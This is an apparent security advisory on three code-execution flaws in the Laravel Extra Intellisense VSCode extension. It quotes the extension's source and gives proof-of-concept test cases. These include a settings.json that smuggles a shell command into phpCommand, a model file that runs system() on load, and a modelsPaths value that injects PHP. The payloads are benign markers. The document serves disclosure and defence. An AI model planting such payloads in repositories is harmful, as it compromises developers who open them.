# Laravel Extra Intellisense - Security Vulnerabilities

## 1. Command Injection via phpCommand Setting

### Description
The `phpCommand` setting allows users to customize how PHP code is executed to interact with their Laravel application. The extension uses this setting to construct a shell command that executes PHP code, but it fails to properly sanitize the PHP code being injected into this command. An attacker could create a malicious repository containing a specially crafted Laravel project with modified configuration that exploits this vulnerability.

When a victim opens this repository in VSCode with the Laravel Extra Intellisense extension installed, the extension will automatically execute shell commands using the user's configured `phpCommand` value or the default one. The attacker can break out of the PHP execution context and execute arbitrary shell commands.

### Impact
Command injection enables attackers to execute arbitrary commands on the victim's machine with the same privileges as the VSCode process. This could lead to data theft, installation of malware, network pivoting, or a complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension attempts to escape double quotes with a backslash and handles dollar signs on Unix platforms, but these mitigations are insufficient to prevent sophisticated command injection attacks.

### Missing Mitigations
- Proper sanitization and validation of PHP code before execution
- Use of safer execution methods that don't involve shell commands
- Sandboxing the execution environment
- Explicit user confirmation before executing code from newly opened repositories

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a malicious repository in VSCode

### Source Code Analysis
In `helpers.ts`, the `runPhp` method contains the vulnerability:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");  // Only escapes double quotes
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");  // Only handles dollar signs on Unix
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);  // Constructs the shell command

    // Executes the shell command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) { /* ... */ }
    );
    // ...
}
```

The code attempts to escape some special characters but doesn't account for all possible shell injection vectors. For example, if an attacker includes PHP code with backticks, they could execute arbitrary shell commands.

### Security Test Case
1. Create a malicious Laravel project with a model file containing payload
2. In the Laravel project, include a `.vscode/settings.json` file with:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"/* legitimate-looking code */\"; echo vulnerable; $(echo 'touch /tmp/pwned')"
   }
   ```
3. Commit the project to a repository
4. Send the repository URL to the victim
5. When the victim opens the project in VSCode with Laravel Extra Intellisense extension, the extension will execute the command, resulting in the creation of `/tmp/pwned` file
6. Verify that the file was created, proving that arbitrary command execution occurred

## 2. Remote Code Execution through PHP Execution in Model Loading

### Description
The extension automatically loads and executes PHP code from the Laravel project without proper validation. When examining Model files, it includes and executes them to gather information for intellisense features. This allows an attacker to craft a malicious model file that will be executed automatically when the extension scans files during extension activation or when the user triggers autocompletion.

### Impact
An attacker can execute arbitrary PHP code on the victim's machine, potentially leading to exfiltration of sensitive information, backdoor installation, or further command execution using PHP functions like `system()` or `exec()`.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
Limited to running the PHP code in the context of the Laravel application, which still allows code execution.

### Missing Mitigations
- Static analysis of PHP files before execution
- Sandboxing PHP execution
- Explicit user consent before loading model files
- Allow-list of safe PHP operations

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a repository containing malicious PHP model files

### Source Code Analysis
In `EloquentProvider.ts`, the `loadModels` method contains code that is vulnerable to RCE:

```typescript
loadModels() {
    var self = this;
    try {
        Helpers.runLaravel(
            "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
            "   if (is_dir(base_path($modelPath))) {" +
            "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
            "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
            "             include_once base_path(\"$modelPath/$sourceFile\");" +  // Includes and executes PHP files from the project
            "         }" +
            "      }" +
            "   }" +
            "}" +
            // More code that processes the models...
        );
    } catch (exception) {
        console.error(exception);
    }
}
```

This code scans directories specified in the 'modelsPaths' configuration (defaulting to 'app' and 'app/Models'), and for each PHP file found, it includes and executes it. This means that any PHP code in these files will be executed when the extension loads models, which happens automatically during initialization.

The actual execution happens in the `runLaravel` method in `helpers.ts`, which executes PHP code in the context of the Laravel application:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // More Laravel bootstrapping code...
            code +  // The provided PHP code is injected here
            // More code...

        return new Promise(function (resolve, error) {
            self.runPhp(command, description)  // Executes the PHP code
            // ...
        });
    }
    return new Promise((resolve, error) => resolve(""));
}
```

### Security Test Case
1. Create a malicious Laravel project
2. Add a malicious model file at `app/Models/Exploit.php`:
```php
<?php
namespace App\Models;

// This code will be executed automatically when Laravel Extra Intellisense scans models
$payload = "<?php system('id > /tmp/rce_success'); ?>";
file_put_contents('/tmp/exploit.php', $payload);
system('php /tmp/exploit.php');

class Exploit extends \Illuminate\Database\Eloquent\Model
{
    // Normal-looking model code to avoid suspicion
    protected $table = 'exploits';
    protected $fillable = ['name'];
}
?>
```
3. Commit the project to a repository
4. Send the repository URL to the victim
5. When the victim opens the project in VSCode with Laravel Extra Intellisense extension, the extension will automatically scan and load model files
6. Verify that the file `/tmp/rce_success` contains the output of the `id` command, proving successful code execution

## 3. Code Injection via PHP String Concatenation

### Description
The extension builds PHP code by concatenating strings without proper sanitization or escaping of user-controlled values from configuration settings. This allows an attacker to inject malicious PHP code that will be executed when the extension runs its various provider methods.

### Impact
An attacker can execute arbitrary PHP code on the victim's machine, allowing access to the file system, network, or other system resources available to the PHP process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The code directly concatenates configuration values into PHP code strings.

### Missing Mitigations
- Proper validation and sanitization of configuration values
- Use of parameterized approaches instead of string concatenation
- Isolation of user-controlled values from executable code

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a repository with a customized configuration

### Source Code Analysis
Multiple provider files construct PHP code by string concatenation. For example, in `EloquentProvider.ts`:

```typescript
Helpers.runLaravel(
    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
    // More PHP code construction...
);
```

The `modelsPaths` configuration value is directly concatenated into the PHP code. If an attacker can control this value, they could potentially break out of the string context and inject their own PHP code.

In `MiddlewareProvider.ts`, `loadMiddlewares()` concatenates PHP code without proper escaping:

```typescript
Helpers.runLaravel(
    "$middlewares = array_merge(app('Illuminate\\Contracts\\Http\\Kernel')->getMiddlewareGroups(), app('Illuminate\\Contracts\\Http\\Kernel')->getRouteMiddleware());" +
    // More PHP code...
);
```

### Security Test Case
1. Create a malicious Laravel project with a `.vscode/settings.json` file containing:
```json
{
  "LaravelExtraIntellisense.modelsPaths": ["app/Models', ']; system('touch /tmp/code_injection_success'); $x = '"]
}
```
2. The code above breaks out of the string context in the PHP code constructed in `EloquentProvider.ts`
3. Commit the project to a repository
4. Send the repository URL to the victim
5. When the victim opens the project in VSCode and the extension activates, it will construct and execute PHP code with the injected malicious command
6. Verify that the file `/tmp/code_injection_success` was created, proving successful code injection
